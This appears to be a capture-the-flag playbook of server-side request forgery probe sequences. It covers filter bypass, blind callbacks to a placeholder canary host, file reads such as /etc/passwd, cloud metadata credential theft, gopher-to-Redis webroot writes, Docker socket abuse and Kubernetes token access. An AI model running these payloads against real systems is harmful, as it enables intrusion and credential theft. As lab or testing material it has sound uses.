# Probe sequences — the ordered play-books

The step-by-step sequences for the recurring situations — each is
a bounded chain, not a spray.

---

## Sequence A — "a url-param exists, nothing known"

```text
1. url=http://127.0.0.1:1/ → refused? → the fetch confirmed —
   read the error-string — refused means loopback-dial works
2. url=http://YOUR-CANARY/ → the callback → egress + UA +
   the fetcher's headers — the fetcher-matrix pick
3. url=http://127.0.0.1:<app-port>/ → the loopback-route —
   /admin /flag /status — the app's own routes
4. url=file:///etc/passwd → file-read open? → the file-map
5. url=http://169.254.169.254/latest/meta-data/ → cloud?
→ the first-5 tells you which world exists — proceed into the
  open one's chain
```

## Sequence B — "the url is filtered"

```text
1. name the check — the error-string names it — error-analysis.md
2. string-check → url-parsing.md the matching family — the
   encoding/@/#/suffix — sanitizer_fuzz sweeps
3. resolution-check → dns-rebind — the two-lookup gap
4. fetch-time-check → the resolved-ip is dialled → no url-trick —
   the redirect or the different-scheme
5. whitelist → whitelist-shapes — the subdomain/suffix/parser-diff
6. scheme-check → the scheme-table — the allowed-schemes probe-set
```

## Sequence C — "internal reachable, flag unknown"

```text
1. the loopback-inventory — ssrf_probe --ports — the open-ports
2. each open-port → fingerprint → internal-services.md the chain
3. the app's own port → /flag /admin /actuator/env — the
   internal-routes.md wordlist
4. file:///flag file:///app/flag file:///proc/self/environ — the
   read-paths
5. the metadata → the cloud-flag-paths
6. the subnet — /proc/net/arp → the neighbors → the sibling-
   services — the compose-names
```

## Sequence D — "blind — nothing comes back"

```text
1. the canary — the callback proves the fetch — the source-ip +
   UA is the fingerprint
2. the timing/status oracle — ssrf_probe's elapsed — the port-map
   by differential
3. the error-echo — send a known-bad → the error-string — the
   refused-vs-timeout split
4. the state-write escalation — gopher→redis→SET + read-back —
   or the webroot-write → the file is a url
5. the OOB-only-end — the write-read channel is the only path —
   if there's no store → inconclusive — the escalation-rungs
```

## Sequence E — "the deferred-fetch"

```text
1. register the canary → the hit → when it fires + the source-ip
   + the worker-UA — the deferred-context
2. find the results-channel — the status/history page — where
   does the fetch's output surface?
3. register url=http://internal-flag-route → the worker fetches →
   the result lands in the results-channel → read it
4. or the deferred-fetch is a browser → the xss-adjacent class —
   the html+js payload — the bot-exfil — different-skill
```

## Sequence F — "redis/redis-shaped store"

```text
1. gopher://127.0.0.1:6379/_PING → +PONG → redis confirmed
2. _KEYS%20* → the inventory → the flag-key? — read the keys
3. _GET%20<key> → the flag-key's value
4. _EVAL → lua — the call-get-trick — read without a direct-GET
5. the write-path — _CONFIG GET dir → _CONFIG SET dir /var/www/
   → _SET the payload → _SAVE → the webroot-write → fetch the file
6. the replica-chain — _SLAVEOF — the module-load — modern-redis
```

## Sequence G — "the cloud-shape"

```text
1. 169.254.169.254/latest/meta-data/ → aws? → the response's shape
2. aws → /latest/user-data (the flag-first) → /latest/meta-data/
   iam/security-credentials/ → the role-name → the creds
3. gcp → the v1beta1 — /computeMetadata/v1beta1/?recursive=true —
   the header-less shape — the token + the startup-script + kube-env
4. azure → /metadata/instance?api-version=… + Metadata:true —
   the managed-identity-token
5. do/alibaba/etc → the per-cloud table — cloud-metadata.md
```

## Sequence H — "the container-shape"

```text
1. /proc/self/cgroup via file:// → the container-markers
2. docker-socket → http+unix or tcp-2375 → /containers/json →
   the container-inventory → the envs → the flag-in-env
3. or the spawn — POST /containers/create with host-mount →
   the container reads /host/flag → the logs → flag
4. k8s → the SA-token file → the api → the secrets
5. the compose-siblings — the service-names — the subnet-sweep
```

## Sequence I — "the whitelist"

```text
1. map the check — the send-set that identifies the check-shape —
   whitelist-shapes.md §11
2. the matching family — endswith → the suffix-in-path —
   contains → the token-anywhere — parse-then-check → the
   parser-diff — strict → the redirect-or-rebind
3. the allowed-domain's open-redirect → the chain — the app
   whitelists the domain — its redirect bounces you inside
4. the allowed-subdomain you control — a subdomain of the allowed-
   domain you have dns on — or an allowed-domain's own internal-
   name
```

## Sequence J — "the egress-blocked"

```text
1. internal-probe → refused-error → the class confirmed
2. file:///etc/passwd → the fs
3. 169.254.169.254 → the link-local exception — metadata may
   still reach — the link-local route
4. the internal-services — the port-map + the chains
5. the state-write — the shared-store — the write-read channel
6. the sibling-services — the compose-names — the subnet
```

## Sequence K — "the gopher-available"

```text
1. the callback's UA said curl → gopher likely works
2. gopher://127.0.0.1:6379/_PING → +PONG → the wire-shape is right
3. gopher→redis the full-session — the chains
4. gopher→memcached → the text-protocol — stats+get
5. gopher→smtp → the internal-mail
6. gopher→fcgi → the auto_prepend → RCE
7. gopher→http → the header-controlled-request — the Host/XFF
   injection
```

## Sequence L — "the second-order"

```text
1. store the url — the webhook/profile/feed — the write-check
   passes
2. the fetch is deferred — the results-channel is the oracle —
   the status-page the response
3. the stored-url points internal — the write-check passed the
   string — the fetch re-parses differently — the differential
4. the deferred-context — the worker/admin/bot — different reach
```

## The budget-note

```text
each sequence is a mechanism-class — the 5-probe budget applies —
the SEQUENCES are different classes not different probes —
spending 5 on A then 5 on C is the intended shape — the budget
binds within a mechanism not across them
```
